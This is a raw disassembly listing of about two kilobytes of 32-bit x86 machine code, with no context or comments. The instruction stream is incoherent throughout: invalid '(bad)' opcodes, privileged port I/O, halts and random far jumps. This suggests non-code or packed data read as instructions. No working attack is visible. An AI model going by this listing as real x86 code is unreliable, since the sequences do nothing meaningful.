  411316:	scas   al,BYTE PTR es:[edi]
  411317:	call   0xd049:0x2555c0ed
  41131e:	sub    al,0x1a
  411320:	push   edx
  411321:	xchg   ch,dl
  411323:	dec    esi
  411324:	aam    0x45
  411326:	jge    0x41134d
  411328:	std    
  411329:	out    dx,al
  41132a:	fsubr  st(6),st
  41132c:	push   edi
  41132d:	(bad)  
  41132e:	jge    0x4112ea
  411330:	sub    al,0xf6
  411332:	xor    DWORD PTR [esi],ecx
  411334:	push   cs
  411335:	xor    al,0xeb
  411337:	das    
  411338:	fidiv  WORD PTR [ecx-0x30ae3e94]
  41133e:	dec    ecx
  41133f:	jmp    0xe758e2d4
  411344:	cmp    DWORD PTR [eax],edi
  411346:	push   cs
  411347:	xor    eax,ecx
  411349:	fisttp DWORD PTR [ecx+0x3a]
  41134c:	gs pop ebp
  41134e:	mov    BYTE PTR [edi+ebx*4+0x5],al
  411352:	test   eax,0xb395ff30
  411357:	rcr    DWORD PTR [eax-0x29],0xcf
  41135b:	mov    bh,0xb5
  41135d:	sub    esp,DWORD PTR [eax+edi*1+0x166ec47e]
  411364:	scas   eax,DWORD PTR es:[edi]
  411365:	daa    
  411366:	pusha  
  411367:	(bad)
  41136a:	aas    
  41136b:	test   DWORD PTR ds:0x956f5f26,edx
  411371:	inc    eax
  411372:	xchg   ebx,eax
  411373:	jmp    0xc48f:0xbf914cd7
  41137a:	cs dec ebx
  41137c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41137d:	jg     0x4113f6
  41137f:	sub    DWORD PTR [edx+0x5e],edi
  411382:	or     eax,0xf4fc3083
  411387:	mov    cl,0xc2
  411389:	ss jmp 0x3a8dfcd
  41138f:	cmp    al,0x21
  411391:	add    al,0xe5
  411393:	mov    esp,edx
  411395:	xor    eax,0x49eaac54
  41139a:	jnp    0x4113cd
  41139c:	mov    esp,fs
  41139e:	rcr    DWORD PTR [eax],0xe5
  4113a1:	mov    edi,0xb4b0c7df
  4113a6:	lock loopne 0x411420
  4113a9:	cmc    
  4113aa:	ror    BYTE PTR [esp+ebx*4-0x62524320],1
  4113b1:	(bad)  
  4113b2:	out    0x28,al
  4113b4:	push   cs
  4113b5:	ss or  eax,0x85283445
  4113bb:	and    BYTE PTR ds:0x30600da5,ch
  4113c1:	cmp    DWORD PTR [ebx+eiz*8],esi
  4113c4:	cmp    BYTE PTR [edi+0x7a544677],ch
  4113ca:	xchg   edx,eax
  4113cb:	ret    
  4113cc:	in     eax,0x9a
  4113ce:	adc    esp,DWORD PTR [edx-0xd]
  4113d1:	cmp    BYTE PTR [ebp-0x44],cl
  4113d4:	ins    BYTE PTR es:[edi],dx
  4113d5:	test   eax,0x8ecff214
  4113da:	out    dx,al
  4113db:	imul   edi,DWORD PTR [edi+0x7],0xfffffff0
  4113df:	ror    edi,cl
  4113e1:	mov    al,0x30
  4113e3:	int    0x33
  4113e5:	xchg   ebx,eax
  4113e6:	mov    BYTE PTR [ecx+0xb],ah
  4113e9:	jp     0x4113bf
  4113eb:	dec    ecx
  4113ec:	inc    esp
  4113ed:	arpl   WORD PTR [edi],dx
  4113ef:	ror    ecx,1
  4113f1:	jb     0x4113fa
  4113f3:	add    al,0xcf
  4113f5:	sub    BYTE PTR [edx+0x5f],al
  4113f8:	xor    eax,ebp
  4113fa:	push   ecx
  4113fb:	or     al,0x6e
  4113fd:	jne    0x411417
  4113ff:	pop    esi
  411400:	inc    ebx
  411401:	inc    edx
  411402:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411403:	mov    ch,0x9c
  411405:	and    eax,0xd7413c4f
  41140a:	das    
  41140b:	out    0x40,eax
  41140d:	xchg   edx,eax
  41140e:	lods   al,BYTE PTR ds:[esi]
  41140f:	iret   
  411410:	fbld   TBYTE PTR [eax-0x21]
  411413:	dec    edi
  411414:	pop    eax
  411415:	outs   dx,DWORD PTR ds:[esi]
  411416:	pop    ds
  411417:	jb     0x4113a4
  411419:	xchg   ebp,eax
  41141a:	data16 aaa 
  41141c:	cmc    
  41141d:	inc    edx
  41141e:	gs push esp
  411420:	std    
  411421:	adc    al,0xd3
  411423:	scas   al,BYTE PTR es:[edi]
  411424:	jae    0x41148e
  411426:	cmp    BYTE PTR [edi-0x58b8b97a],ah
  41142c:	add    BYTE PTR [ebp-0x2e],ah
  41142f:	xchg   esi,eax
  411430:	push   edi
  411431:	shl    DWORD PTR [bx+0x42],0x3d
  411436:	ins    DWORD PTR es:[edi],dx
  411437:	jge    0x411435
  411439:	cmp    ecx,DWORD PTR [ebx+0x5b903aee]
  41143f:	jnp    0x4114b9
  411441:	add    al,0x1
  411443:	cdq    
  411444:	sbb    al,0xb0
  411446:	xor    DWORD PTR [esi+ebx*8-0x4a],ebp
  41144a:	push   esi
  41144b:	inc    edx
  41144c:	xchg   DWORD PTR [ebx-0x3f],esi
  41144f:	sub    al,0x25
  411451:	(bad)  
  411452:	adc    BYTE PTR [esi+0x12],bh
  411455:	and    DWORD PTR [ebp+eax*2-0xc],ecx
  411459:	mov    al,0xf4
  41145b:	outs   dx,BYTE PTR ds:[esi]
  41145c:	ficom  DWORD PTR cs:[edx-0x5e]
  411460:	cmp    DWORD PTR [ebp+0x34],eax
  411463:	clc    
  411464:	bound  ecx,QWORD PTR [ecx-0x71ee3232]
  41146a:	push   ds
  41146b:	jne    0x411455
  41146d:	lea    eax,[ebp-0x4a]
  411470:	addr16 pop esi
  411472:	jl     0x41144d
  411474:	test   BYTE PTR [ecx+0x4b],cl
  411477:	mov    cl,0x46
  411479:	pop    edx
  41147a:	jle    0x4114a9
  41147c:	jg     0x411404
  41147e:	loope  0x4114a5
  411480:	or     dl,BYTE PTR [edx-0x7d]
  411483:	or     ecx,DWORD PTR [esi-0x6db75003]
  411489:	xchg   esi,eax
  41148a:	inc    edi
  41148b:	xor    bl,BYTE PTR [ecx]
  41148d:	sbb    al,ah
  41148f:	jmp    0x40b5:0x75dfbeaa
  411496:	xor    al,0xd4
  411498:	jbe    0x411428
  41149a:	add    ch,BYTE PTR [ebx-0x3f7d06fd]
  4114a0:	xor    ah,BYTE PTR [esi+edi*1+0x48]
  4114a4:	rcl    BYTE PTR [eax+edx*1+0x7a],0xfb
  4114a9:	mov    ecx,0x7fa2547b
  4114ae:	mov    ds:0x67fd160f,eax
  4114b3:	inc    eax
  4114b4:	hlt    
  4114b5:	push   ds
  4114b6:	xor    cl,BYTE PTR [esi+0x5d]
  4114b9:	shr    BYTE PTR [ebp+0xc7b57a3],1
  4114bf:	or     al,0xc7
  4114c1:	sbb    BYTE PTR [bp+si+0x46a],dl
  4114c6:	xchg   ebp,eax
  4114c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4114c8:	ds xor ch,ah
  4114cb:	jp     0x411516
  4114cd:	ffree  st(0)
  4114cf:	call   0x85d2:0x5709d525
  4114d6:	outs   dx,DWORD PTR ds:[esi]
  4114d7:	mov    ah,0xa2
  4114d9:	gs ds fwait
  4114dc:	push   esp
  4114dd:	pop    ecx
  4114de:	ror    BYTE PTR [eax+0x416196d3],0xf
  4114e5:	js     0x41153f
  4114e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4114e8:	inc    edi
  4114e9:	pop    DWORD PTR ds:0xc68c4b92
  4114ef:	pop    es
  4114f0:	sub    edx,ebp
  4114f2:	(bad)  
  4114f3:	stc    
  4114f4:	ins    DWORD PTR es:[edi],dx
  4114f5:	pop    ss
  4114f6:	fidiv  WORD PTR ds:0x8ce3840c
  4114fc:	shr    BYTE PTR [ebp-0x79e5ebfe],1
  411502:	cmp    eax,0xb38388c
  411507:	or     ch,al
  411509:	pop    edi
  41150a:	jnp    0x411581
  41150c:	inc    edx
  41150d:	jmp    0x1ee9:0x384f55a1
  411514:	cmp    eax,0x74372bd5
  411519:	das    
  41151a:	test   al,0xe
  41151c:	out    dx,eax
  41151d:	sub    eax,0xdd213e8b
  411522:	rcl    DWORD PTR [ecx+eiz*1],0x77
  411526:	dec    ecx
  411527:	fistp  QWORD PTR [ebp-0x2b]
  41152a:	es push ss
  41152c:	sub    eax,0x2c3ad46a
  411531:	pop    ebx
  411532:	out    dx,eax
  411533:	idiv   esp
  411535:	xchg   ebx,eax
  411536:	loope  0x41156d
  411538:	je     0x411579
  41153a:	leave  
  41153b:	xchg   edi,eax
  41153c:	mov    ds:0x4ff994ba,al
  411541:	sbb    DWORD PTR [edi],ecx
  411543:	mov    dh,0x73
  411545:	shr    DWORD PTR [ebp-0x4163eb34],0x44
  41154c:	mov    ah,0xb0
  41154e:	and    DWORD PTR [ebx+0x55],0xffffff8c
  411552:	clc    
  411553:	push   esi
  411554:	fdivr  DWORD PTR [edi-0x7ffa37c9]
  41155a:	or     BYTE PTR [ebx],0x7
  41155d:	jae    0x4114e4
  41155f:	enter  0x94f5,0x3c
  411563:	fdiv   DWORD PTR [ecx+0x41]
  411566:	push   ds
  411567:	xor    cl,BYTE PTR [edx]
  411569:	push   ecx
  41156a:	mov    eax,esi
  41156c:	jl     0x411577
  41156e:	scas   al,BYTE PTR es:[edi]
  41156f:	cs xchg dx,ax
  411572:	loopne 0x41152c
  411574:	dec    ebp
  411575:	lds    eax,FWORD PTR [eax+0x4c0965c5]
  41157b:	loope  0x411530
  41157d:	loop   0x41152b
  41157f:	sbb    ecx,DWORD PTR [edi+edi*2-0x707f1072]
  411586:	push   ecx
  411587:	dec    eax
  411588:	in     al,dx
  411589:	push   es
  41158a:	xchg   esi,eax
  41158b:	inc    ecx
  41158c:	mov    al,0x11
  41158e:	lea    ebp,[edx-0x34306568]
  411594:	cwde   
  411595:	mov    bl,0xcb
  411597:	imul   esi,DWORD PTR [edi-0x2b23b82],0x58730a7c
  4115a1:	int    0x33
  4115a3:	xor    ch,BYTE PTR [edi-0x71]
  4115a6:	cmp    dh,bl
  4115a8:	xor    BYTE PTR [ebp+esi*8-0x80],al
  4115ac:	mov    eax,ds:0x9b78f68
  4115b1:	mov    ds:0xaabec959,eax
  4115b6:	xchg   edx,eax
  4115b7:	sbb    DWORD PTR [ecx+esi*1+0x6b],ecx
  4115bb:	inc    eax
  4115bc:	jbe    0x4115e4
  4115be:	icebp  
  4115bf:	jb     0x411548
  4115c1:	cli    
  4115c2:	aad    0xd2
  4115c4:	lods   eax,DWORD PTR ds:[esi]
  4115c5:	stc    
  4115c6:	push   DWORD PTR [edi+ebx*8+0x7c77b941]
  4115cd:	jg     0x4115b2
  4115cf:	popf   
  4115d0:	pop    edi
  4115d1:	sbb    eax,0xe8de363b
  4115d6:	xor    DWORD PTR [eax+0x5b],edi
  4115d9:	mov    bh,0xed
  4115db:	test   DWORD PTR [eax-0x6500ece6],0x9423e6
  4115e5:	(bad)  
  4115e6:	mov    WORD PTR [edi],es
  4115e8:	pop    eax
  4115e9:	pop    es
  4115ea:	imul   esi,esi,0x394f5954
  4115f0:	ss pop esp
  4115f2:	(bad)  
  4115f3:	aad    0x67
  4115f5:	sbb    BYTE PTR [ecx+0x7b],0x6a
  4115f9:	jno    0x4115e9
  4115fb:	mov    bl,0x86
  4115fd:	sub    BYTE PTR [esi+0x4ab5d4cd],bl
  411603:	cmp    al,0x32
  411605:	aaa    
  411606:	in     al,dx
  411607:	retf   0x5232
  41160a:	fbstp  TBYTE PTR [eax]
  41160c:	add    DWORD PTR [eax+0x73],ebp
  41160f:	pop    ecx
  411610:	sti    
  411611:	adc    DWORD PTR ds:0xae150a9a,eax
  411617:	retf   0x53ed
  41161a:	shl    DWORD PTR [edx+0x6a],0x13
  41161e:	dec    edi
  41161f:	push   esp
  411620:	mov    WORD PTR ds:0x28693c38,cs
  411626:	adc    DWORD PTR [esi],ecx
  411628:	lock adc cl,BYTE PTR [ecx+0x46]
  41162c:	inc    esp
  41162d:	data16 test al,0x21
  411630:	mov    esp,DWORD PTR [eax+eax*1-0x12a9782a]
  411637:	push   ds
  411638:	retf   
  411639:	jne    0x411670
  41163b:	out    0x1,al
  41163d:	push   0xf523d141
  411642:	sub    BYTE PTR [esi+0x72],ch
  411645:	iret   
  411646:	and    eax,DWORD PTR [ebp-0x45698d32]
  41164c:	mov    ebx,0x6a8a75eb
  411651:	in     al,dx
  411652:	xchg   edi,eax
  411653:	cmp    eax,0x3b4a813e
  411658:	clc    
  411659:	add    bl,BYTE PTR [esi+0x2b]
  41165c:	or     ecx,0x57
  41165f:	jle    0x4116c9
  411661:	push   edi
  411662:	out    0xb0,eax
  411664:	mov    ebp,DWORD PTR [eax+0x46]
  411667:	pushf  
  411668:	ins    DWORD PTR es:[edi],dx
  411669:	in     al,dx
  41166a:	ret    0x939e
  41166d:	shl    DWORD PTR [eax],1
  41166f:	push   ss
  411670:	pop    edi
  411671:	in     al,dx
  411672:	sbb    al,0xc0
  411674:	addr16 dec ebp
  411676:	jecxz  0x411637
  411678:	and    edx,DWORD PTR [ebx]
  41167a:	ret    0xd238
  41167d:	dec    esp
  41167e:	push   ss
  41167f:	out    dx,al
  411680:	outs   dx,BYTE PTR ds:[esi]
  411681:	lock cdq 
  411683:	dec    ebp
  411684:	jo     0x4116c5
  411686:	mov    eax,0xac6687aa
  41168b:	cdq    
  41168c:	(bad)
  41168f:	jle    0x4116eb
  411691:	cmp    ebp,DWORD PTR [ecx+0x7a14d8c4]
  411697:	fisub  DWORD PTR [ecx+0x648a1003]
  41169d:	lock cmp ebp,esi
  4116a0:	sub    dh,dh
  4116a2:	mov    eax,ds:0xe2adb086
  4116a7:	hlt    
  4116a8:	test   DWORD PTR [esp+esi*8],edi
  4116ab:	push   ecx
  4116ac:	mov    ds:0x5cb30d45,al
  4116b1:	cmp    al,0xd9
  4116b3:	cwde   
  4116b4:	cld    
  4116b5:	sbb    BYTE PTR [ecx+eiz*2-0x23770ea3],ch
  4116bc:	dec    ebp
  4116bd:	ret    0x953d
  4116c0:	sbb    eax,0xfd58ed78
  4116c5:	fsub   QWORD PTR [edx-0x5a0b23e7]
  4116cb:	dec    ebp
  4116cc:	jnp    0x4116ae
  4116ce:	mov    ebx,0xa3b1a1fc
  4116d3:	inc    esi
  4116d4:	cmp    al,0xc5
  4116d6:	jns    0x411684
  4116d8:	addr16 fdivrp st(0),st
  4116db:	push   es
  4116dc:	add    ebx,ebp
  4116de:	mov    al,ds:0x491ad2c0
  4116e3:	nop
  4116e4:	fdivrp st(0),st
  4116e6:	mov    bh,0x61
  4116e8:	inc    edi
  4116e9:	adc    esi,DWORD PTR [ecx-0xfd0d53f]
  4116ef:	dec    ebx
  4116f0:	xchg   esp,eax
  4116f1:	lods   al,BYTE PTR ds:[esi]
  4116f2:	add    al,0x4b
  4116f4:	jns    0x411755
  4116f6:	jecxz  0x4116b6
  4116f8:	aaa    
  4116f9:	lods   eax,DWORD PTR ds:[esi]
  4116fa:	add    BYTE PTR [ebx+0x1e],cl
  4116fd:	in     eax,dx
  4116fe:	mov    ds:0xe2b6c6b7,al
  411703:	mov    dh,0x3c
  411705:	fnstenv [ebx+0x3]
  411708:	into   
  411709:	add    BYTE PTR [ebx+0x4a834e72],dh
  41170f:	int    0x6e
  411711:	daa    
  411712:	sbb    eax,0xa0b012c7
  411717:	inc    esi
  411718:	mov    esi,0x6f0ec7d3
  41171d:	mov    ah,0x2a
  41171f:	sbb    eax,0x9e37c49b
  411724:	out    dx,al
  411725:	inc    edi
  411726:	sub    DWORD PTR [esi+0x76cc9fb8],ebx
  41172c:	adc    dh,ch
  41172e:	sub    DWORD PTR [esi],esi
  411730:	addr16 push 0xffffffdb
  411733:	(bad)  
  411734:	push   esi
  411735:	div    DWORD PTR [ebp-0x50]
  411738:	pop    DWORD PTR [edx-0x7eab54dc]
  41173e:	in     al,0xe9
  411740:	mov    al,BYTE PTR [esi+0x7f04f86b]
  411746:	ss push si
  411749:	adc    BYTE PTR [esi],0x74
  41174c:	test   DWORD PTR [ebx+0x4e],eax
  41174f:	test   BYTE PTR [edi+edi*4],bl
  411752:	cmp    eax,0x7f176e69
  411757:	mov    esp,0xfbf05175
  41175c:	cmp    DWORD PTR [ecx+0x1967454e],ebx
  411762:	imul   ebx,DWORD PTR [ebp-0x4b7b789d],0x22
  411769:	or     al,0x5d
  41176b:	retf   0x480
  41176e:	lds    eax,FWORD PTR [ebx+edi*1-0x15]
  411772:	cmp    BYTE PTR cs:[esp+eax*8],ah
  411776:	mov    dh,0xed
  411778:	sar    DWORD PTR [edx],cl
  41177a:	shl    BYTE PTR [esi+edx*4+0x44],cl
  41177e:	arpl   WORD PTR [ebp+ebx*2-0x3edcebf5],cx
  411785:	ret    
  411786:	stos   DWORD PTR es:[edi],eax
  411787:	bound  edx,QWORD PTR [edx-0x5f]
  41178a:	fistp  WORD PTR [edx-0x66]
  41178d:	sub    al,0xcb
  41178f:	xor    eax,0x90effe41
  411794:	dec    ecx
  411795:	call   eax
  411797:	popf   
  411798:	les    eax,FWORD PTR ds:0xaa13b0ed
  41179e:	mov    edi,0xe23421
  4117a3:	mov    eax,0xd27b5516
  4117a8:	mov    esi,0xc7635773
  4117ad:	repnz adc ecx,edx
  4117b0:	dec    ebp
  4117b1:	(bad)  
  4117b3:	sbb    eax,0x2a31e209
  4117b8:	repz (bad) 
  4117ba:	imul   ebp,DWORD PTR [ebx-0x7b79832a],0x5d0c7c57
  4117c4:	loopne 0x4117da
  4117c6:	jle    0x4117e4
  4117c8:	ja     0x41174c
  4117ca:	ror    DWORD PTR [eax-0x78],0x5b
  4117ce:	push   edx
  4117cf:	shr    esp,1
  4117d1:	xchg   esi,eax
  4117d2:	scas   eax,DWORD PTR es:[edi]
  4117d3:	adc    DWORD PTR [ebp+0x2],0x78
  4117d7:	iret   
  4117d8:	shr    BYTE PTR [ebx+edx*1-0x2d],0x4
  4117dd:	sub    DWORD PTR [ebp-0x33],esi
  4117e0:	fcom   QWORD PTR [ebx+0x722fbe2]
  4117e6:	out    0xfe,eax
  4117e8:	sub    al,BYTE PTR [ebp-0x1eeff9e7]
  4117ee:	mov    ?,WORD PTR [eax]
  4117f0:	and    eax,0xa2c3f943
  4117f5:	(bad)  
  4117f6:	rcl    BYTE PTR [edi],cl
  4117f8:	mov    ecx,0x55ef41ef
  4117fd:	add    edx,eax
  4117ff:	mov    ds:0xd14177b6,al
  411804:	jecxz  0x411834
  411806:	xor    eax,0x700e6d22
  41180b:	loope  0x411817
  41180d:	jge    0x411867
  41180f:	jp     0x41186e
  411811:	bound  edi,QWORD PTR [esp+eiz*2-0x3f0b3c96]
  411818:	inc    edx
  411819:	sub    al,0xfa
  41181b:	adc    cl,bh
  41181d:	cld    
  41181e:	ds cmp ebp,esi
  411821:	add    BYTE PTR [ebx+0x5d],bh
  411824:	or     DWORD PTR [eax-0x2bbe8b58],eax
  41182a:	sti    
  41182b:	loope  0x41187e
  41182d:	lock jae 0x4117fd
  411830:	xchg   edi,eax
  411831:	xor    DWORD PTR [eax+0x4f],esi
  411834:	int3   
  411835:	aad    0x8e
  411837:	pop    ebx
  411838:	add    al,0xab
  41183a:	add    al,0x56
  41183c:	dec    edi
  41183d:	xchg   edi,eax
  41183e:	cmp    eax,0xd8b17c4b
  411843:	leave  
  411844:	xchg   esp,eax
  411845:	and    ah,dh
  411847:	(bad)  
  411849:	data16 and bh,BYTE PTR [edi+0x60d20e9a]
  411850:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411852:	out    0x2,eax
  411854:	xchg   ebx,eax
  411855:	(bad)  
  411856:	mov    esp,0xc1a6913f
  41185b:	push   es
  41185c:	retf   0x912
  41185f:	pop    edx
  411860:	fcmovbe st,st(1)
  411862:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411863:	mov    ch,BYTE PTR [esi]
  411865:	ins    BYTE PTR es:[edi],dx
  411866:	sahf   
  411867:	lahf   
  411868:	push   0x4b
  41186a:	shl    eax,cl
  41186c:	(bad)  
  41186e:	pop    ds
  41186f:	inc    ecx
  411870:	mov    ds:0xdebbce36,eax
  411875:	xor    ah,bh
  411877:	cmp    dl,BYTE PTR [edx+0x1f109058]
  41187d:	mov    ds:0x71247fb3,eax
  411882:	scas   eax,DWORD PTR es:[edi]
  411883:	ins    BYTE PTR es:[edi],dx
  411884:	sbb    BYTE PTR [edx-0x6d],ch
  411887:	add    DWORD PTR [eax+ebx*2],eax
  41188a:	mov    dl,0x7b
  41188c:	or     eax,0x66cd4218
  411891:	push   ebp
  411892:	lock mov dh,0x81
  411895:	bound  ebp,QWORD PTR [esi]
  411897:	enter  0x4b0,0x8e
  41189b:	leave  
  41189c:	nop
  41189d:	jns    0x4118c9
  41189f:	push   ebx
  4118a0:	jmp    0x411870
  4118a2:	lods   eax,DWORD PTR ds:[esi]
  4118a4:	xor    eax,0xce621efc
  4118a9:	fsub   DWORD PTR [esp+ebx*1+0x7c55339c]
  4118b0:	fwait
  4118b1:	xchg   ecx,esp
  4118b3:	add    BYTE PTR [ebp-0x1bbbd634],0x1a
  4118ba:	out    0x3c,eax
  4118bc:	test   DWORD PTR [edx+0x6a],ecx
  4118bf:	jmp    0x3ae3:0x750751d9
  4118c6:	in     eax,dx
  4118c7:	jns    0x411918
  4118c9:	in     eax,0xf8
  4118cb:	nop
  4118cc:	pop    edi
  4118cd:	pop    ebp
  4118ce:	or     DWORD PTR [esi-0x462cbac4],0x2046b624
  4118d8:	cmp    ebp,ebp
  4118da:	xchg   edi,eax
  4118db:	mov    edi,0x4cdbadaf
  4118e0:	lods   eax,DWORD PTR ds:[esi]
  4118e1:	pop    ecx
  4118e2:	cmp    BYTE PTR [esi+0x4b3e6183],bh
  4118e8:	mov    BYTE PTR [edx],cl
  4118ea:	pusha  
  4118eb:	xchg   ecx,eax
  4118ec:	adc    cl,dh
  4118ee:	jbe    0x411945
  4118f0:	aad    0x3
  4118f2:	xor    ch,BYTE PTR ds:0xacd8666e
  4118f8:	mov    dl,0x85
  4118fa:	ret    0xe8ad
  4118fd:	jge    0x411880
  4118ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411900:	and    dh,cl
  411902:	stc    
  411903:	into   
  411904:	data16 jge 0x4118a1
  411907:	shr    BYTE PTR [esi+0x3d],0xdc
  41190b:	into   
  41190c:	xchg   esp,eax
  41190d:	out    0xbb,eax
  41190f:	fimul  DWORD PTR [edi+edx*1-0x491dfaa9]
  411916:	iret   
  411917:	jo     0x411993
  411919:	stos   BYTE PTR es:[edi],al
  41191a:	add    eax,0x6675af68
  41191f:	fwait
  411920:	or     ebp,ebx
  411922:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  411924:	lahf   
  411925:	xor    edx,DWORD PTR [ecx-0x10]
  411928:	enter  0x3c36,0xfc
  41192c:	fild   QWORD PTR [ecx+0x1fe25223]
  411932:	xchg   ecx,eax
  411933:	idiv   edx
  411935:	retf   0xd763
  411938:	hlt    
  411939:	xchg   esi,eax
  41193a:	out    dx,eax
  41193b:	jmp    0xb372dcb8
  411940:	(bad)  
  411941:	lock add DWORD PTR [eax-0x73e3b4f9],esp
  411948:	rcl    BYTE PTR [ebx+0x1a30acec],1
  41194e:	and    al,0x35
  411950:	sub    ecx,esi
  411952:	neg    BYTE PTR [esi]
  411954:	xor    al,0xcf
  411956:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411957:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411958:	jg     0x411935
  41195a:	(bad)  
  41195b:	jmp    0x411933
  41195d:	ror    DWORD PTR [ebp+0x47faa7b3],1
  411963:	or     bh,BYTE PTR [edi-0x58]
  411966:	bound  esi,QWORD PTR [ebx]
  411968:	lods   eax,DWORD PTR ds:[esi]
  411969:	mov    al,ds:0xb3578047
  41196e:	push   esi
  41196f:	pop    ecx
  411970:	jbe    0x411978
  411972:	repz mov bh,0x82
  411975:	add    al,0x79
  411977:	arpl   dx,sp
  411979:	cld    
  41197a:	xor    esi,DWORD PTR [ebx]
  41197c:	mov    ah,0x98
  41197e:	arpl   WORD PTR [ecx-0x22],si
  411981:	jmp    0x5b9a78fe
  411986:	pop    edi
  411987:	out    0xad,al
  411989:	add    BYTE PTR [ebx-0x37],ch
  41198c:	sub    BYTE PTR [ebp-0x12f8c413],dl
  411992:	mov    eax,fs
  411994:	std    
  411995:	cmp    dl,al
  411997:	out    0x8f,al
  411999:	pop    ebp
  41199a:	adc    BYTE PTR ds:0x2c86715e,0xb7
  4119a1:	pusha  
  4119a2:	push   eax
  4119a3:	cs stos DWORD PTR es:[edi],eax
  4119a5:	mov    al,0x4e
  4119a7:	je     0x411958
  4119a9:	xchg   BYTE PTR [edi],bl
  4119ab:	sti    
  4119ac:	or     al,0x18
  4119ae:	dec    ecx
  4119af:	gs mov edi,0x59bd2cb7
  4119b5:	hlt    
  4119b6:	mov    edx,0x1598c5cd
  4119bb:	or     bh,bh
  4119bd:	cmp    DWORD PTR [ecx-0x62],ebx
  4119c0:	sub    esp,eax
  4119c2:	pop    edx
  4119c3:	fwait
  4119c4:	mov    al,BYTE PTR [eax+0x2de612f2]
  4119ca:	push   ebx
  4119cb:	loop   0x4119f2
  4119cd:	lock imul ecx,DWORD PTR [edx+0x39c41bd3],0x4e6d11
  4119d8:	xchg   esi,eax
  4119d9:	repz mov dh,0x4
  4119dc:	cmc    
  4119dd:	xor    esp,ebx
  4119df:	mov    ebp,0xff22eecb
  4119e4:	xchg   esp,eax
  4119e5:	in     eax,dx
  4119e6:	and    dl,ah
  4119e8:	mov    cs,WORD PTR [ebp-0x2c]
  4119eb:	loop   0x4119c7
  4119ed:	and    BYTE PTR [esp+eiz*4-0x14],al
  4119f1:	jnp    0x411a3b
  4119f3:	test   BYTE PTR [ebx+0xd4c16a8],bh
  4119f9:	xchg   ebx,eax
  4119fa:	icebp  
  4119fb:	int3   
  4119fc:	repz call 0x1eb6be1c
  411a02:	jecxz  0x411a48
  411a04:	cli    
  411a05:	mov    edx,0x8e7f11f9
  411a0a:	pop    ecx
  411a0b:	cmp    al,BYTE PTR [esp-0x278e9f04]
  411a12:	pop    ss
  411a13:	std    
  411a14:	imul   ecx,DWORD PTR [ebx],0x43
  411a17:	and    al,0x44
  411a19:	es ins DWORD PTR es:[edi],dx
  411a1b:	mov    esp,0x8dcc75d3
  411a20:	jmp    0xdb8:0x1bc6c79b
  411a27:	xor    eax,0x5f52d982
  411a2c:	cmp    al,0x6c
  411a2e:	push   ebx
  411a2f:	xchg   ebx,eax
  411a30:	and    eax,DWORD PTR ds:[ecx+0x18b4b2dc]
  411a37:	mov    DWORD PTR [eax],edx
  411a39:	jle    0x411a04
  411a3b:	outs   dx,BYTE PTR ds:[esi]
  411a3c:	cs push ebp
  411a3e:	xchg   ebp,eax
  411a3f:	and    al,0xed
  411a41:	or     DWORD PTR [esi-0x4a4a2bec],esp
  411a47:	and    bl,BYTE PTR [esi-0x7f222364]
  411a4d:	repnz in eax,dx
  411a4f:	(bad)  
  411a50:	fisub  WORD PTR [eax+edi*8-0x51a49771]
  411a57:	or     eax,0x829736b7
  411a5c:	je     0x411a2f
  411a5e:	lods   al,BYTE PTR ds:[esi]
  411a5f:	jge    0x411a4e
  411a61:	jmp    DWORD PTR [ebx+0x5c0d2eab]
  411a67:	data16 fwait
  411a69:	mov    ch,0xd1
  411a6b:	mov    cl,0x28
  411a6d:	ret    
  411a6e:	lods   eax,DWORD PTR ds:[esi]
  411a6f:	jbe    0x411a1b
  411a71:	loopne 0x411ac3
  411a73:	ins    BYTE PTR es:[edi],dx
  411a74:	scas   al,BYTE PTR es:[edi]
  411a75:	sub    ah,BYTE PTR [esi]
  411a77:	test   eax,0xb97db046
  411a7c:	add    eax,0x3bce2022
  411a81:	adc    bl,al
  411a83:	add    esp,DWORD PTR [edi+esi*2-0x24]
  411a87:	call   FWORD PTR [ecx+edi*8]
  411a8a:	mov    ebx,0x4da9a8f9
  411a8f:	cmp    ecx,DWORD PTR [ebp+0x42f68f17]
  411a95:	jecxz  0x411a99
  411a97:	into   
  411a98:	pop    ebp
  411a99:	outs   dx,DWORD PTR ds:[esi]
  411a9a:	xor    BYTE PTR [ecx-0x13191959],ch
  411aa0:	fnsave [ebx-0x24]
  411aa3:	repz and cl,BYTE PTR [eax+0x2d]
  411aa7:	ret    0x1f29
  411aaa:	push   cs
  411aab:	fstp   QWORD PTR cs:[ebx+0x135e6672]
  411ab2:	mov    ebp,0x45e766ab
  411ab7:	xchg   esi,eax
  411ab8:	xchg   edx,eax
  411ab9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411aba:	inc    ecx
  411abb:	jbe    0x411b21
  411abd:	sub    edx,DWORD PTR [edx+ebp*8-0x3]
  411ac1:	inc    ebx
  411ac2:	mov    al,ds:0x2b3d0beb
  411ac7:	stos   DWORD PTR es:[edi],eax
  411ac8:	imul   ebp,DWORD PTR [eax],0xf3fa2023
  411ace:	das    
  411acf:	or     DWORD PTR [eax-0x12],ecx
  411ad2:	shr    BYTE PTR [eax-0x11ac3bcc],cl
  411ad8:	xor    bl,dl
  411ada:	sar    bh,cl
  411adc:	popf   
  411add:	adc    bl,0xae
  411ae0:	in     al,0xcd
  411ae2:	adc    dl,bh
  411ae4:	jle    0x411b17
  411ae6:	ds jne 0x411b3f
  411ae9:	pop    eax
  411aea:	dec    ecx
  411aeb:	fwait
  411aec:	ret    0x4ef5
  411aef:	cmp    al,0xcd
  411af1:	gs es pop esp
  411af4:	fs (bad) 
  411af6:	sbb    DWORD PTR [eax+0x473d2239],esp
  411afc:	add    BYTE PTR [edx+0x43],ah
  411aff:	mov    edx,0x90dec748
  411b04:	sbb    DWORD PTR [eax-0x31],0x85262e33
  411b0b:	jg     0x411afd
  411b0d:	mov    bl,0x26
  411b0f:	popa   
  411b10:	div    BYTE PTR [eax-0x6d]
  411b13:	jae    0x411b31
